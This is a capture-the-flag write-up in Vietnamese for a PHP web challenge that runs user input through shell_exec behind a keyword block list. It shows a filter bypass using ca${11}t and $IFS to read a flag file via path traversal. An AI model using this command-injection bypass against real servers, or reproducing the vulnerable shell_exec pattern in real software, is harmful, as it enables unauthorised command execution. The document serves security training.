# Web Challenge 2
## Bắt đầu làm
```php
<?php
if(!isset($_GET['cmd'])){
    highlight_file(__FILE__);
}
else{
    $_GET['cmd']=addslashes($_GET['cmd']);
    if(preg_match("/cat|ls|head|\'|\"|less| |nl|echo|more|tail|grep|dir|tac|\>|\<|\=|\*|\&|\,|\`|\@/is",$_GET['cmd'])){
        die("bad linux user");
    }
    else{
        echo shell_exec($_GET['cmd']);
    }
}
?>
```
## Suy đoán lỗi có thể khai thác
Ta sẽ nhận ra một dòng lệnh kiến cho ta có thể đưa các shell code vào là shell_exec($_GET[‘cmd’]);
## Khai thác lỗi
Ta cần phải đưa Shellcode (ls, cat, ...)
## Vượt qua filter
Ta gặp một số filter như addslashes hay preg_match và hiển nhiên đã lọc đi các lệnh như ls, cat, ...
Tuy nhiên ta có thể sử dụng l${x}s và ca${x}t với x > 10 để vượt qua filter lọc các lệnh Linux.
Đồng thời ta có thể sử dụng $IFS như một mã lệnh đặc biệt để thay cho ký tự " " đã bị lọc.
## Đoạn mã
```
/?cmd=ca${11}t$IFS../../../flag.txt
```
## Kết quả
```
flag{b3st_b3st_b3st} 
```
